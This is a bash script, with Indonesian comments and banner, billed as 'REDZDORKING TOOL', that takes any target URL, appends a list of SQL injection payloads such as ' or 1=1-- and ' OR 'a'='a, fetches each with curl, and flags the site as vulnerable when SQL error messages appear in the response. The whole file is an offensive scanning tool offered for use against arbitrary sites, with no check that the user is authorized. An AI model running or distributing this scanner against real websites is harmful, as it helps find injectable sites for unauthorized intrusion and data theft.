#!/bin/bash

# Warna UI
red='\033[1;31m'
green='\033[1;32m'
cyan='\033[1;36m'
yellow='\033[1;33m'
reset='\033[0m'

# Banner
clear
echo -e "${red}"
echo "╔════════════════════════════════════════╗"
echo "║           REDZDORKING TOOL 😈          ║"
echo "║   SQLi Vulnerability Auto Scanner 🔍   ║"
echo "╚════════════════════════════════════════╝"
echo -e "${reset}"

# Cek dependensi
for tool in curl grep; do
    if ! command -v $tool >/dev/null 2>&1; then
        echo -e "${red}[!] $tool belum terinstall! Jalankan: pkg install $tool -y${reset}"
        exit 1
    fi
done

# Input URL
read -p "🌐 Masukkan URL target (tanpa http:// atau https://): " target
read -p "📁 Nama file hasil log (contoh: hasil.txt): " logfile
target="http://$target"

# Cek koneksi
echo -e "${cyan}🔍 Mengecek koneksi ke $target ...${reset}"
ping -c 1 $(echo $target | sed 's|http[s]*://||') >/dev/null 2>&1
if [ $? -ne 0 ]; then
    echo -e "${red}[!] Gagal terhubung ke situs!${reset}"
    exit 1
fi

# Simbol SQLi dicoba
payloads=("'" "\"'" "'--" "' or 1=1--" "\" or \"\"=\"" "' OR 'a'='a")

echo -e "${yellow}🚀 Mulai scanning dengan payload SQLi...${reset}"
echo "" > "$logfile"

for payload in "${payloads[@]}"; do
    test_url="${target}${payload}"
    response=$(curl -s -k --max-time 10 "$test_url")

    if echo "$response" | grep -iE "sql syntax|mysql_fetch|syntax error|ODBC|sql error|you have an error in your sql" >/dev/null; then
        echo -e "${green}[+] VULNERABLE dengan payload: ${payload}${reset}"
        echo "[VULN] $test_url (Payload: $payload)" >> "$logfile"
    else
        echo -e "${red}[-] Tidak vulnerable dengan payload: ${payload}${reset}"
    fi
done

echo ""
echo -e "${cyan}📄 Hasil disimpan di file: ${logfile}${reset}"
echo -e "${green}✅ Selesai bro! Gunakan dengan bijak ya... 😎${reset}"
